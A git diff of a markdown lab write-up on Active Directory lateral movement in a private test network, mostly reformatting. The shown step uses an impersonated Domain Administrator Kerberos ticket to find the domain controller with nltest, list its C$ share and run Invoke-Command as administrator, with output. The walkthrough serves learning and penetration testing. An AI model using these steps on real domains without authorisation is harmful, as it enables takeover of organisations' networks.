@@ -7,7 +7,7 @@ HOSTNAME | MACHINE IP | OS | Description
 --- | --- | --- | ---
 KALI-WINDOWS | 192.168.150.1 | Windows 10 | An attacker machine
 MSEDGEWIN10 | 192.168.150.128 | Windows 10 Enterprise Evaluation| A Remote Machine
-BOSSMANBEN | 192.168.150.133 | Windows Server 2016 | A Domain Controller (Primary: __\\\\WIN-BO2CT95INDP__)
+BOSSMANBEN | 192.168.150.133 | Windows Server 2016 | A Domain Controller
 
 #### USERS:
 USER | MACHINE | PRIVILEGES
@@ -23,7 +23,7 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
 1. Both machines IPs are listed in each other's trustedhosts
 2. `-skipnetworkprofilecheck` is enabled (to allow connection over a public network)
 3. Proper firewall exceptions are in place in the remote machine
-#### ii. The remote machine is part of a Domain Controller ( __\\\\WIN-BO2CT95INDP__ )
+#### ii. The remote machine is part of a Domain Controller (BOSSMANBEN)
 1. A domain user is a local administrator to the remote machine
 2. Credentials to the said domain user are known
 #### iii. The Domain Administrator has logged in to the remote machine (MSEDGEWIN10)
@@ -275,37 +275,40 @@ BOSSMANBEN\\Administrator | MSEDGEWIN10 | Domain Administrator
    - The current ticket for the session is now `Administrator @ BOSSMANBEN.LOCAL` which is a Domain Administrator
    - The current PSSession should now be able to impersonate the Domain Administrator
 4. Check if the Domain Controller (BOSSMANBEN) now accessible:
-   ```ps1
-   nltest /DCNAME:BOSSMANBEN
-   ```
-   ```
-   PDC for Domain BOSSMANBEn is \\WIN-BO2CT95INDP
-   The command completed successfully
-   ```
-   ```ps1
-   dir \\WIN-BO2CT95INDP\C$
-   ```
-   ```
+   - Get the Primary Domain Controller for BOSSMANBEN:
+     ```ps1
+     nltest /DCNAME:BOSSMANBEN
+     ```
+     ```
+     PDC for Domain BOSSMANBEN is \\WIN-BO2CT95INDP
+     The command completed successfully
+     ```
+   - List contents of the file share, `C$`:
+     ```ps1
+     dir \\WIN-BO2CT95INDP\C$
+     ```
+     ```
    
-       Directory: \\WIN-BO2CT95INDP\C$
+         Directory: \\WIN-BO2CT95INDP\C$
 
 
-   Mode                LastWriteTime         Length Name
-   ----                -------------         ------ ----
-   d-----       16/07/2016   6:23 AM                PerfLogs
-   d-r---       09/07/2019   3:01 PM                Program Files
-   d-----       16/07/2016   6:23 AM                Program Files (x86)
-   d-r---       09/07/2019   3:01 PM                Users
-   d-----       09/07/2019   3:10 PM                Windows
-   -a----       11/07/2019  12:53 PM              5 gg
+     Mode                LastWriteTime         Length Name
+     ----                -------------         ------ ----
+     d-----       16/07/2016   6:23 AM                PerfLogs
+     d-r---       09/07/2019   3:01 PM                Program Files
+     d-----       16/07/2016   6:23 AM                Program Files (x86)
+     d-r---       09/07/2019   3:01 PM                Users
+     d-----       09/07/2019   3:10 PM                Windows
+     -a----       11/07/2019  12:53 PM              5 gg
 
-   ```
-   ```ps1
-   Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }
-   ```
-   ```
-   bossmanben\administrator
-   ```
+     ```
+   - Pass commands as the Domain Administrator:
+     ```ps1
+     Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }
+     ```
+     ```
+     bossmanben\administrator
+     ```
    __NOTE(S)__:
    - The file shares in the Domain Controller (BOSSMANBEN) are now accessible as long as the Domain Controller is being accessed using kerberos authentication.
-   - Commands could also be executed in the context of the Domain Controller (BOSSMANBEN) using the `Invoke-Command` module in PowerShell.
+   - Commands could also now be executed in the context of the Domain Controller (BOSSMANBEN) using the `Invoke-Command` module in PowerShell.
